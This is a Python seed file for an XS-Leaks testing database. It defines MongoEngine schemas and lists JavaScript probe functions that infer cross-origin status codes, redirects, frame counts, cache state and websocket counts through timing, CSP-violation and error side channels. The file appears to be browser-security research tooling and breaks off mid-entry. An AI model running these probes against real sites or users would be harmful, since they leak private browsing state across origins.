from mongoengine import Document, StringField, ListField, connect, DynamicDocument, DictField, IntField

connect(db="XS-Leaks")
# Data to be stored
class browsers(Document):
    name = StringField(required=True)

class differences(Document):
    name = StringField(required=True)
    response0 = DictField(required=True)
    response1 = DictField(required=True)

class inclusionmethods(Document):
    name = StringField(required=True)
    template = StringField(required=True)


class filetypes(Document):
    name=StringField(required=True)
    contenttype=StringField(required=True)
    filetemplate=StringField(required=True)


class elementgroup(Document):
    url                 = StringField()
    state               = StringField()
    browser             = StringField()
    response            = StringField()
    resources = DictField()


class testtemplate(Document):
    test_name=StringField(required=True)
    test_category=StringField()
    test_description=StringField()
    test_file=StringField(required=True)
    test_timeout=IntField()
    test_needswindow=StringField()
    def to_json(self):
        return {
            "_id": str(self.pk),
            "test_name": self.test_name,
            "test_category": self.test_category,
            "test_description": self.test_description,
            "test_file": self.test_file,
            "test_timeout": self.test_timeout,
            "test_needswindow": self.test_needswindow
        }

inclusionmethods_datalist=[
        {
            "name": "iframe",
            "template": "iframe.html"
        },
        {
            "name": "iframecsp",
            "template": "iframecsp.html"
        },
        {
            "name": "iframecspreload",
            "template": "iframecspreload.html"
        },
        {
            "name": "iframehashreload",
            "template": "iframehashreload.html"
        },
        {
            "name": "image",
            "template": "image.html"
        },
        {
            "name": "stylesheet",
            "template": "stylesheet.html"
        },
        {
            "name": "object",
            "template": "object.html"
        },
        {
            "name": "script",
            "template": "script.html"
        },
        {
            "name": "embed",
            "template": "embed.html"
        },
        {
            "name": "audio",
            "template": "audio.html"
        },
        {
            "name": "video",
            "template": "video.html"
        },
        {
            "name": "windowopen",
            "template": "windowopen.html"
        },
        {
            "name": "formaction",
            "template": "formaction.html"
        },
        {
            "name": "formactioncsp",
            "template": "formactioncsp.html"
        },
        {
            "name": "fetch",
            "template": "fetch.html"
        },
        {
            "name": "relpreloadscript",
            "template": "relpreloadscript.html"
        },
        {
            "name": "relpreloadstyle",
            "template": "relpreloadstyle.html"
        },
    ]
filetypes_datalist= [
        {
            "name": "html",
            "contenttype": "text/html",
            "filetemplate": "test.html"
        },
        {
            "name": "css",
            "contenttype": "text/css",
            "filetemplate": "test.css"
        },
        {
            "name": "text",
            "contenttype": "text/plain",
            "filetemplate": "test.css"
        },
        {
            "name": "gif",
            "contenttype": "image/gif",
            "filetemplate": "test.gif"
        },
        {
            "name": "wav",
            "contenttype": "audio/wav",
            "filetemplate": "test.wav"
        },
        {
            "name": "pdf",
            "contenttype": "application/pdf",
            "filetemplate": "test.pdf"
        },
        {
            "name": "js",
            "contenttype": "application/javascript",
            "filetemplate": "test.js"
        },
        {
            "name": "json",
            "contenttype": "application/json",
            "filetemplate": "test.json"
        }

    ]
browsers_datalist=["chrome", "firefox", "webkit"]
differences_datalist= [
        {
            "name": "none",
            "response0": {
                "status": 200,
                "headers": []
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name": "timingalloworigin",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Timing-Allow-Origin",
                        "value": "*"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name": "xframeoptions",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "X-Frame-Options",
                        "value": "sameorigin"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name":"crossoriginresourcepolicy",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Cross-Origin-Resource-Policy",
                        "value": "same-origin"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name":"csp",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Content-Security-Policy",
                        "value": "default-src 'self';"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name":"cspframeancestors",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Content-Security-Policy",
                        "value": "frame-ancestors 'self';"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name":"contentdisposition",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Content-Disposition",
                        "value": "attachment; filename=leak.txt"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name":"xcontenttypeoptions",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "X-Content-Type-Options",
                        "value": "nosniff"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name":"crossoriginopenerpolicy",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Cross-Origin-Opener-Policy",
                        "value": "same-origin"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name":"acceptranges",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Accept-Ranges",
                        "value": "bytes"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name":"cspframeancestorsvsxframeoptions",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Content-Security-Policy",
                        "value": "frame-ancestors 'self';"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": [
                    {
                        "name": "X-Frame-Options",
                        "value": "Deny"
                    }
                ]
            }
        },
        {
            "name": "200vs500",
            "response0": {
                "status": 200,
                "headers": []
            },
            "response1": {
                "status": 500,
                "headers": []
            }
        },
        {
            "name": "redirect",
            "response0": {
                "status": 302,
                "headers": [
                    {
                        "name": "Location",
                        "value": "https://example.com"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name": "refresh0s",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Refresh",
                        "value": "0;url=https://example.com"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name": "refresh1s",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "Refresh",
                        "value": "1;url=https://example.com"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        },
        {
            "name": "testing",
            "response0": {
                "status": 200,
                "headers": [
                    {
                        "name": "X-Connection",
                        "value": "close"
                    },
                    {
                        "name": "Connection",
                        "value": "close"
                    }
                ]
            },
            "response1": {
                "status": 200,
                "headers": []
            }
        }
    ],

datalist = [
    {
        "url": "https://baidu.com/",
        "state": "ano",
        "resources":{
            "inclusionmethods": ["img","object"],
            "domain": ["baidu.com","dss0.bdstatic.com","pss.bdstatic.com","hectorstatic.baidu.com","sp1.baidu.com","sp2.baidu.com","hector.baidu.com"],
            "file": ["index.html",""]
        },
        "response": "<html><body><h1>This is a test page.</h1></body></html>",
        "browser":"chrome"
    },
    {
        "url": "https://www.baidu.com/",
        "state": "visited",
        "resources":{
            "inclusionmethods": ["img", "object"],
            "domain": ["baidu.com", "dss0.bdstatic.com", "pss.bdstatic.com", "hectorstatic.baidu.com", "sp1.baidu.com",
                   "sp2.baidu.com", "hector.baidu.com"],
            "file": ["index.html", ""]
        },

        "response": "<html><body><h1>This is a test page.</h1></body></html>",
        "browser":"chrome"
    },
]



#
# for inclusionmethod in inclusionmethods_datalist:
#     print(inclusionmethod.get('name'))
#     print('\n')
#     inclusionmethods(name=inclusionmethod.get('name'),template=inclusionmethod.get('template')).save()
#
# for filetype in filetypes_datalist:
#     filetypes(name=filetype.get('name'),contenttype=filetype.get('contenttype'),filetemplate=filetype.get('filetemplate')).save()
#
# for browser in browsers_datalist:
#     browsers(name=browser).save()
#
# for difference in differences_datalist:
#     for diff in difference:
#         differences(name=diff.get('name'),response0=diff.get('response0'),response1=diff.get('response1')).save()

# for data in datalist:
#     print(data)
#     elementgroup(url=data.get('url'),resources=data.get('resources'),state=data.get('state'),response=data.get('response'),browser=data.get('browser')).save()

testtemp=[
  {
    "test_name": "Performance API Error Leak",
    "test_category": "Status Code",
    "test_description": "Detect errors with Performance API.",
    "test_file": "/src/leaks/leak_performance_error.js",
    "test_function": "async e=>{\r\n        let t = document.createElement(\"script\");\r\n        return t.src = e,\r\n        new Promise((n=>{\r\n            t.onload = t.onerror = ()=>{\r\n                t.remove();\r\n                let s = performance.getEntriesByType(\"resource\").filter((t=>t.name === e)).length;\r\n                return console.debug(`len = ${s}`),\r\n                n(0 !== s ? 0 : 1)\r\n            }\r\n            ,\r\n            document.body.appendChild(t)\r\n        }\r\n        ))\r\n    }"
  },
  {
    "test_name": "Event Handler Leak (Object)",
    "test_category": "Status Code",
    "test_description": "Detect errors with onload/onerror with object.",
    "test_file": "/src/leaks/leak_eventhandler_object.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"object\");\r\n        n.data = e,\r\n        n.onload = e=>(e.target.remove(),\r\n        t(0)),\r\n        n.onerror = e=>(e.target.remove(),\r\n        t(1)),\r\n        document.body.appendChild(n)\r\n    }\r\n    ))",
    "test_timeout": 4000
  },
  {
    "test_name": "Event Handler Leak (Stylesheet)",
    "test_category": "Status Code",
    "test_description": "Detect errors with onload/onerror with stylesheet.",
    "test_file": "/src/leaks/leak_eventhandler_stylesheet.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"link\");\r\n        n.rel = \"stylesheet\",\r\n        n.href = e,\r\n        n.onload = e=>(e.target.remove(),\r\n        t(0)),\r\n        n.onerror = e=>(e.target.remove(),\r\n        t(1)),\r\n        document.head.appendChild(n)\r\n    }\r\n    ))"
  },
  {
    "test_name": "Event Handler Leak (Script)",
    "test_category": "Status Code",
    "test_description": "Detect errors with onload/onerror with script.",
    "test_file": "/src/leaks/leak_eventhandler_script.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"script\");\r\n        n.src = e,\r\n        n.onload = e=>(e.target.remove(),\r\n        t(0)),\r\n        n.onerror = e=>(e.target.remove(),\r\n        t(1)),\r\n        document.head.appendChild(n)\r\n    }\r\n    ))"
  },
  {
    "test_name": "MediaError Leak",
    "test_category": "Status Code",
    "test_description": "Detect status codes with MediaError message.",
    "test_file": "/src/leaks/leak_mediaerror.js",
    "test_function": "async e=>{\r\n        let t = document.createElement(\"audio\");\r\n        return new Promise((n=>{\r\n            t.src = e,\r\n            t.onerror = e=>{\r\n                let s = e.target.error.message;\r\n                console.debug(s),\r\n                t.remove(),\r\n                n(\"Failed to init decoder\" === s ? 0 : \"500: Internal Server Error\" === s ? 1 : s)\r\n                return n\r\n            }\r\n            ,\r\n            document.body.appendChild(t)\r\n        }\r\n        ))\r\n    }"
  },
  {
    "test_name": "Style Reload Error Leak",
    "test_category": "Status Code",
    "test_description": "Detect errors with style reload bug.",
    "test_file": "/src/leaks/leak_stylereload_error.js",
    "test_function": "async (e) => {\r\n  return new Promise((t) => {\r\n    let s = document.createElement(\"iframe\");\r\n\r\n    // 处理跨域问题\r\n    s.srcdoc = `\r\n        <html>\r\n        <body>\r\n                <script onload=\"parent.postMessage('', '*')\"\\n                    src='https://xsinator.com/3sleep'><\\/script>\r\n                <style>\\n                    @import '${e}';\\n                </style>\\n                \\n        </body>\r\n        </html>`;\r\n\r\n    // 等待 iframe 加载完成\r\n    s.onload = () => {\r\n      window.onmessage = async (a) => {\r\n        await n(1e3); // 设置延时计时器1000\r\n\r\n        // 捕获异常\r\n        try {\r\n          let o = s.contentWindow.performance.getEntriesByType(\"resource\");\r\n          console.debug(o);\r\n        } catch (err) {\r\n          console.error(err);\r\n          t(0);\r\n          return;\r\n        }\r\n\r\n        s.remove();\r\n        let i = o.filter((t) => t.name === e).length;\r\n\r\n        return 2 === i ? t(1) : 1 === i ? t(0) : 0 === i ? t(1) : (console.debug(`requests: ${i}`), t(`requests: ${i}`));\r\n      };\r\n    };\r\n\r\n    // 5秒超时\r\n    setTimeout(() => {\r\n      s.remove();\r\n      t(0);\r\n    }, 5e3);\r\n\r\n    document.body.appendChild(s);\r\n  });\r\n}",
    "test_timeout": 6000
  },
  {
    "test_name": "Request Merging Error Leak",
    "test_category": "Status Code",
    "test_description": "Detect errors with request merging.",
    "test_file": "/src/leaks/leak_requestmerging_error.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"iframe\");\r\n        window.onmessage = async e=>{\r\n            await s(300);\r\n            let a = n.contentWindow.performance.getEntriesByType(\"resource\").length - 1;\r\n            return n.remove(),\r\n            t(-1 === a ? 1 : a)\r\n        }\r\n        ,\r\n        n.srcdoc = `\\n        <html>\\n        <body>\\n                <script onerror=\"parent.postMessage('', '*')\" \\n                    src='${e}'><\\/script>\\n                <script onload=\"parent.postMessage('', '*')\"\\n                    src='${e}'>\\n                <\\/script>\\n        </body>\\n        </html>`,\r\n        document.body.appendChild(n)\r\n    }\r\n    ))",
    "test_timeout": 4000
  },
  {
    "test_name": "CORS Error Leak",
    "test_category": "Redirects",
    "test_description": "Leak redirect target URL with CORS error.",
    "test_file": "/src/leaks/leak_cors_error.js",
    "test_function": "async e=>fetch(e, {\r\n        credentials: \"include\",\r\n        mode: \"cors\"\r\n    }).catch((e=>{\r\n        console.debug(e.message);\r\n        let t = e.message.match(/redirection to (https?:\\/\\/.*) denied/);\r\n        return t && t[1] ? \"https://example.com/?secret#secret\" === t[1] ? 1 : t[1] : 0\r\n    }\r\n    ))"
  },
  {
    "test_name": "Redirect Start Leak",
    "test_category": "Redirects",
    "test_description": "Detect cross-origin HTTP redirects by checking redirectStart time.",
    "test_file": "/src/leaks/leak_performanceiframe_redirect.js",
    "test_function": "async e => {\r\n  let t = document.createElement(\"iframe\");\r\n  return t.src = e,\r\n    new Promise((n) => {\r\n      t.onload = t.onerror = async () => {\r\n        t.remove();\r\n\r\n        // Check for available Entry before accessing properties:\r\n        const entries = performance.getEntriesByType(\"resource\");\r\n        const matchingEntry = entries.find((t) => t.name === e);\r\n\r\n        try {\r\n          if (matchingEntry) {\r\n            // Access properties only if the Entry exists:\r\n            const redirectStatus = matchingEntry.redirectStart === 0 ? 0 : 1;\r\n            n(redirectStatus);\r\n          } else {\r\n            // Handle the case where there's no matching Entry:\r\n            console.warn(\"No matching resource entry found.\");\r\n            n(null); // Or indicate an error with a different value\r\n          }\r\n        } catch (error) {\r\n          console.error(\"Error handling resource entry:\", error);\r\n          n(null); // Or indicate an error with a different value\r\n        }\r\n      };\r\n      document.body.appendChild(t);\r\n    });\r\n}"
  },
  {
    "test_name": "Duration Redirect Leak",
    "test_category": "Redirects",
    "test_description": "Detect cross-origin redirects by checking the duration.",
    "test_file": "/src/leaks/leak_performancefetch_redirect.js",
    "test_function": "async (e) => {\r\n  return new Promise(async (t) => {\r\n    try {\r\n      // Fetch the resource:\r\n      await fetch(e, {\r\n        mode: \"no-cors\", // Consider alternative approaches if CORS is needed\r\n        credentials: \"include\"\r\n      });\r\n\r\n      // Wait for a short duration for potential redirects:\r\n      await await a(300);\r\n\r\n      // Check for available Entry before accessing properties:\r\n      const entries = performance.getEntriesByType(\"resource\");\r\n      const matchingEntry = entries.find((t) => t.name === e);\r\n\r\n      if (matchingEntry) {\r\n        console.debug(\"Duration: \", matchingEntry.duration);\r\n        t(matchingEntry.duration <= 0 ? 1 : 0); // Reverse logic for easier interpretation\r\n      } else {\r\n        console.warn(\"No matching resource entry found for:\", e);\r\n        // Handle the case where there's no matching Entry (e.g., return a default value)\r\n        t(null); // Or another value indicating an error\r\n      }\r\n    } catch (error) {\r\n      console.error(\"Error fetching or processing resource:\", error);\r\n      t(null); // Or another value indicating an error\r\n    }\r\n  });\r\n}"
  },
  {
    "test_name": "Fetch Redirect Leak",
    "test_category": "Redirects",
    "test_description": "Detect HTTP redirects with Fetch API.",
    "test_file": "/src/leaks/leak_fetch_redirect.js",
    "test_function": "async e=>fetch(e, {\r\n        credentials: \"include\",\r\n        mode: \"cors\",\r\n        redirect: \"manual\"\r\n    }).then((e=>(console.debug(`res.type = ${e.type}`),\r\n    \"opaqueredirect\" === e.type ? 1 : void 0))).catch((()=>0))"
  },
  {
    "test_name": "URL Max Length Leak",
    "test_category": "Redirects",
    "test_description": "Detect server redirect by abusing URL max length.",
    "test_file": "/src/leaks/leak_urlmaxlength.js",
    "test_function": "async (e) => {\r\n  return new Promise(async (t) => {\r\n    try {\r\n      // Get resource origin using a safer approach:\r\n      const url = new URL(e); // Consider using URL constructor for robust parsing\r\n      const origin = url.origin;\r\n\r\n      // Recursive binary search function (adjusted for non-negative count):\r\n      const binarySearch = async (target, low = 0, high = 10000) => {\r\n        if (low >= high) {\r\n          return false; // Not found\r\n        }\r\n\r\n        const mid = Math.floor((low + high) / 2);\r\n        const result = await o(i(target, mid));\r\n\r\n        if (result === true) {\r\n          return await o(i(target, mid)) ? mid : binarySearch(target, mid + 1, high);\r\n        } else {\r\n          return binarySearch(target, low, mid - 1);\r\n        }\r\n      };\r\n\r\n      // Check if the origin is valid using binary search:\r\n      const validOrigin = await binarySearch(origin);\r\n\r\n      // Resolve the promise based on the result:\r\n      t(validOrigin ? 0 : 1);\r\n\r\n    } catch (error) {\r\n      console.error(\"Error during origin check:\", error);\r\n      t(null); // Or another value indicating an error\r\n    }\r\n  });\r\n}",
    "test_timeout": 10000
  },
  {
    "test_name": "Max Redirect Leak",
    "test_category": "Redirects",
    "test_description": "Detect server redirect by abusing max redirect limit.",
    "test_file": "/src/leaks/leak_maxredirectlength.js",
    "test_function": "async e=>{\r\n        let t = performance.getEntries().length;\r\n        return fetch(`https://127.0.0.1:9876/maxredirect?n=19&url=${encodeURI(e)}`, {\r\n            credentials: \"include\",\r\n            mode: \"no-cors\"\r\n        }).then((async e=>(await r(500),\r\n        console.log(`${t} === ${performance.getEntries().length}`),\r\n        t === performance.getEntries().length && 0 !== performance.getEntries().length ? 1 : 0))).catch((e=>1))\r\n    }",
    "test_timeout": 6000
  },
  {
    "test_name": "History Length Leak",
    "test_category": "Redirects",
    "test_description": "Detect javascript redirects with History API.",
    "test_file": "/src/leaks/leak_historylength.js",
    "test_function": "async e=>new Promise((async t=>{\r\n        await c(window.WW);\r\n        let n = window.WW.history.length;\r\n        return window.WW.location = e,\r\n        await l(2500),\r\n        await c(window.WW),\r\n        console.debug(window.WW.history.length, n),\r\n        window.WW.history.length - n == 3 ? t(1) : t(0)\r\n    }\r\n    ))",
    "test_timeout": 7000,
    "test_needsWindow": "true"
  },
  {
    "test_name": "CSP Violation Leak",
    "test_category": "Redirects",
    "test_description": "Leak cross-origin redirect target with CSP violation event.",
    "test_file": "/src/leaks/leak_csp_blockeduri.js",
    "test_function": "async t=>new Promise((n=>{\r\n        let s = document.createElement(\"iframe\");\r\n        //添加事件监听器，如果存在csp 重定向返回1\r\n        document.addEventListener('securitypolicyviolation', () => {\r\n        return n(1)\r\n    })\r\n            //否则返回0\r\n        window.onmessage = e=>(s.remove(),n(0)),\r\n        setTimeout((()=>(s.remove(),\r\n        n(0))), 1500),\r\n        s.srcdoc = `<html>\\n        <head>\\n            <meta http-equiv='Content-Security-Policy' content=\"default-src * 'unsafe-inline'; connect-src ${e}\">\\n        </head>\\n        <body>\\n            <script>\\n                document.addEventListener('securitypolicyviolation', e => {parent.postMessage(e.blockedURI, '*')})\\n                fetch('${t}', {mode:'no-cors', credentials: 'include'})\\n            <\\/script>\\n        </body>\\n        </html>`,\r\n        document.body.appendChild(s)\r\n    }\r\n    ))",
    "test_timeout": 4000
  },
  {
    "test_name": "CSP Redirect Detection",
    "test_category": "Redirects",
    "test_description": "Detect cross-origin redirects with CSP violation event.",
    "test_file": "/src/leaks/leak_csp_detect.js",
    "test_function": "async t=>new Promise((n=>{\r\n        let s = document.createElement(\"iframe\");\r\n        window.onmessage = e=>(s.remove(),\r\n        n(1)),\r\n        setTimeout((()=>(s.remove(),\r\n        n(0))), 3e3),\r\n        s.srcdoc = `<html>\\n        <head>\\n            <meta http-equiv='Content-Security-Policy' content=\"default-src * 'unsafe-inline'; connect-src ${e}\">\\n        </head>\\n        <body>\\n            <script>\\n                document.addEventListener('securitypolicyviolation', e => {parent.postMessage(e.blockedURI, '*')})\\n                fetch('${t}', {mode:'no-cors', credentials: 'include'})\\n            <\\/script>\\n        </body>\\n        </html>`,\r\n        document.body.appendChild(s)\r\n    }\r\n    ))",
    "test_timeout": 4000
  },
  {
    "test_name": "WebSocket Leak (FF)",
    "test_category": "API Usage",
    "test_description": "Detect the number of websockets on a page by exausting the socket limit.",
    "test_file": "/src/leaks/leak_websocket_ff.js",
    "test_function": "async(e,t=3e3,n=200)=>{\r\n        let s = \"ws://localhost:8000/ff\";\r\n        m(s, n),\r\n        await u(500);\r\n        let a = d.length;\r\n        ((e=10)=>{\r\n            for (let t = 0; t < e; t++)\r\n                d.shift().close()\r\n        }\r\n        )(10),\r\n        await u(500),\r\n        window.WW.location = e,\r\n        await u(t),\r\n        m(s, 10),\r\n        await u(400);\r\n        let o = a - d.length;\r\n        return (()=>{\r\n            for (let e of d)\r\n                e.close()\r\n        }\r\n        )(),\r\n        window.WW.location = \"about:blank\",\r\n        await u(2e3),\r\n        o\r\n    }",
    "test_timeout": 8000,
    "test_needsWindow": "true"
  },
  {
    "test_name": "WebSocket Leak (GC)",
    "test_category": "API Usage",
    "test_description": "Detect the number of websockets on a page by exausting the socket limit.",
    "test_file": "/src/leaks/leak_websocket_gc.js",
    "test_function": "async(e,t=2e3,n=255)=>{\r\n        let s = performance.now()\r\n          , a = \"ws://localhost:8001/gc\";\r\n        console.log(\"[+] Exausting WS limit until we can not open any new WS.\");\r\n        let o = (e=>{\r\n            let t = document.createElement(\"iframe\");\r\n            return t.src = \"https://crossorigin.xsinator.xyz/testcases/tests/websocket.php?1\",\r\n            document.body.append(t),\r\n            t\r\n        }\r\n        )();\r\n        await h(a, n),\r\n        console.debug(w(), \"=\", p.length),\r\n        await y(),\r\n        console.debug(w(), \"=\", p.length),\r\n        console.log(\"[+] Cannot open any new WS.\");\r\n        let i = v(0);\r\n        console.log(`[+] ${i.length} WS are already open.`),\r\n        f(i),\r\n        await g(300),\r\n        console.debug(w(), \"=\", p.length);\r\n        f(p.slice(0, 10)),\r\n        console.log(\"[+] Closing 10 ws ..\"),\r\n        console.debug(w(), \"=\", p.length),\r\n        console.log(`[+] Opening ${e} in window.`),\r\n        window.WW.location = e,\r\n        await g(t),\r\n        console.log(\"[+] Checking number of WS.\"),\r\n        await h(a, 10),\r\n        await y(),\r\n        console.debug(w(), \"=\", p.length);\r\n        let r = v(0).length;\r\n        return console.log(`[+] ${r} WS on ${e} and ${i.length} WS were already opened.`),\r\n        f(p),\r\n        o.remove(),\r\n        window.WW.location = \"about:blank\",\r\n        await new Promise((async e=>{\r\n            for (; v(2).length; )\r\n                await g(200);\r\n            return e(1)\r\n        }\r\n        )),\r\n        p = [],\r\n        console.debug(`Took ${performance.now() - s}ms.`),\r\n        r\r\n    }",
    "test_timeout": 40000,
    "test_needsWindow": "true"
  },
  {
    "test_name": "Frame Count Leak",
    "test_category": "Page Content",
    "test_description": "Detect the number of iframes on a page.",
    "test_file": "/src/leaks/leak_windowlength.js",
    "test_function": "async e=>new Promise((async t=>(window.WW.location = e,\r\n    await L(500),\r\n    t(window.WW.length))))",
    "test_timeout": 4000,
    "test_needsWindow": "true"
  },
  {
    "test_name": "Media Dimensions Leak",
    "test_category": "Page Content",
    "test_description": "Leak dimensions of images or videos.",
    "test_file": "/src/leaks/leak_medialeak_dimension.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"img\");\r\n        n.src = e,\r\n        n.onload = e=>{\r\n            let n = e.target.naturalHeight\r\n              , s = e.target.naturalWidth;\r\n            return e.target.remove(),\r\n            console.debug(`naturalHeight: ${n}, naturalWidth: ${s}`),\r\n            t(s <= 250 ? 0 : 1)\r\n        }\r\n        ,\r\n        document.body.appendChild(n)\r\n    }\r\n    ))",
    "test_timeout": 4000
  },
  {
    "test_name": "Media Duration Leak",
    "test_category": "Page Content",
    "test_description": "Leak duration of audio or videos.",
    "test_file": "/src/leaks/leak_medialeak_duration.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"audio\");\r\n        n.src = e,\r\n        n.onloadedmetadata = e=>{\r\n            let n = e.target.duration;\r\n            return e.target.remove(),\r\n            console.debug(n),\r\n            t(n < .3 ? 0 : 1)\r\n        }\r\n        ,\r\n        document.body.appendChild(n)\r\n    }\r\n    ))",
    "test_timeout": 4000
  },
  {
    "test_name": "Performance API Empty Page Leak",
    "test_category": "Page Content",
    "test_description": "Detect empty responses with Performance API.",
    "test_file": "/src/leaks/leak_performance_empty.js",
    "test_function": "async e=>{\r\n        let t = document.createElement(\"iframe\");\r\n        return t.src = e,\r\n        new Promise((n=>{\r\n            t.onload = t.onerror = ()=>{\r\n                t.remove();\r\n                let s = performance.getEntriesByType(\"resource\").filter((t=>t.name === e)).length;\r\n                return console.debug(`len = ${s}`),\r\n                n(0 !== s ? 0 : 1)\r\n            }\r\n            ,\r\n            document.body.appendChild(t)\r\n        }\r\n        ))\r\n    }"
  },
  {
    "test_name": "Performance API XSS Auditor Leak",
    "test_category": "Page Content",
    "test_description": "Detect scripts/event handlers in a page with Performance API.",
    "test_file": "/src/leaks/leak_performance_auditor.js",
    "test_function": "async e=>{\r\n        let t = document.createElement(\"iframe\");\r\n        return t.src = e,\r\n        new Promise((n=>{\r\n            t.onload = t.onerror = ()=>{\r\n                t.remove();\r\n                let s = performance.getEntriesByType(\"resource\").filter((t=>t.name === e)).length;\r\n                return console.debug(`len = ${s}`),\r\n                n(0 !== s ? 0 : 1)\r\n            }\r\n            ,\r\n            document.body.appendChild(t)\r\n        }\r\n        ))\r\n    }"
  },
  {
    "test_name": "Cache Leak (CORS)",
    "test_category": "Page Content",
    "test_description": "Detect resources loaded by page. Cache is deleted with CORS error.",
    "test_file": "/src/leaks/leak_cache_cors.js",
    "test_function": "async e=>{\r\n        let t = await (async(e,t=\"POST\")=>{\r\n            let n = 0\r\n              , s = 0;\r\n            for (let s = 0; s < 5; s++)\r\n                await E(e, t),\r\n                await A(100),\r\n                n += await P(e);\r\n            n /= 5,\r\n            await P(e);\r\n            for (let t = 0; t < 5; t++)\r\n                await A(100),\r\n                s += await P(e);\r\n            if (s /= 5,\r\n            console.debug(`avg time nocache: ${n}, avg time cache: ${s}, Limit: ${(n + s) / 2}`),\r\n            n / s < 1.3)\r\n                throw {\r\n                    message: \"No timing difference.\"\r\n                };\r\n            return (n + s) / 2\r\n        }\r\n        )(T, \"CORS\");\r\n        return new Promise((async n=>{\r\n            await E(T, \"CORS\");\r\n            let s = document.createElement(\"iframe\");\r\n            s.src = e,\r\n            document.body.append(s),\r\n            await A(1500),\r\n            s.remove();\r\n            let a = await P(T);\r\n            return console.debug(`request took: ${a}, limit is: ${t}`),\r\n            n(a < t ? 1 : 0)\r\n        }\r\n        ))\r\n    }",
    "test_timeout": 15000
  },
  {
    "test_name": "Cache Leak (POST)",
    "test_category": "Page Content",
    "test_description": "Detect resources loaded by page. Cache is deleted with a POST request.",
    "test_file": "/src/leaks/leak_cache_post.js",
    "test_function": "async e=>{\r\n        let t = await (async(e,t=\"POST\")=>{\r\n            let n = 0\r\n              , s = 0;\r\n            for (let s = 0; s < 5; s++)\r\n                await S(e, t),\r\n                await C(100),\r\n                n += await F(e);\r\n            n /= 5,\r\n            await F(e);\r\n            for (let t = 0; t < 5; t++)\r\n                await C(100),\r\n                s += await F(e);\r\n            if (s /= 5,\r\n            console.debug(`avg time nocache: ${n}, avg time cache: ${s}, Limit: ${(n + s) / 2}`),\r\n            n / s < 1.3)\r\n                throw {\r\n                    message: \"No timing difference.\"\r\n                };\r\n            return (n + s) / 2\r\n        }\r\n        )(x, \"POST\");\r\n        return new Promise((async n=>{\r\n            await S(x, \"POST\");\r\n            let s = document.createElement(\"iframe\");\r\n            s.src = e,\r\n            document.body.append(s),\r\n            await C(1500),\r\n            s.remove();\r\n            let a = await F(x);\r\n            return console.debug(`request took: ${a}, limit is: ${t}`),\r\n            n(a < t ? 1 : 0)\r\n        }\r\n        ))\r\n    }",
    "test_timeout": 15000
  },
  {
    "test_name": "Id Attribute Leak",
    "test_category": "Page Content",
    "test_description": "Leak id attribute of focusable HTML elements with onblur.",
    "test_file": "/src/leaks/leak_onblur.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"iframe\");\r\n        window.onblur = async()=>(console.debug(\"onblur fired\"),\r\n        window.onblur = \"\",\r\n        await W(10),\r\n        n.remove(),\r\n        t(1)),\r\n        setTimeout((()=>(window.onblur = \"\",\r\n        n.remove(),\r\n        t(0))), 1500),\r\n        n.src = `${e}#1337`,\r\n        document.body.appendChild(n)\r\n    }\r\n    ))",
    "test_timeout": 4000
  },
  {
    "test_name": "CSS Property Leak",
    "test_category": "Page Content",
    "test_description": "Leak CSS rules with getComputedStyle.",
    "test_file": "/src/leaks/leak_getcomputedstyle.js",
    "test_function": "async e=>new Promise((t=>{\r\n        let n = document.createElement(\"link\");\r\n        n.rel = \"stylesheet\",\r\n        n.href = e,\r\n        n.onload = e=>{\r\n            let s = document.createElement(\"div\");\r\n            s.className = \"testclassname\",\r\n            document.body.appendChild(s);\r\n            let a = window.getComputedStyle(s, null).getPropertyValue(\"visibility\");\r\n            return s.remove(),\r\n            n.remove(),\r\n            t(\"hidden\" === a ? 1 : 0)\r\n        }\r\n        ,\r\n        n.onerror = e=>(n.remove(),\r\n        t(0)),\r\n        document.head.appendChild(n)\r\n    }\r\n    ))"
  },
  {
    "test_name": "SRI Error Leak",
    "test_category": "HTTP Header",
    "test_description": "Leak content length with SRI error.",
    "test_file": "/src/leaks/leak_sri_error.js",
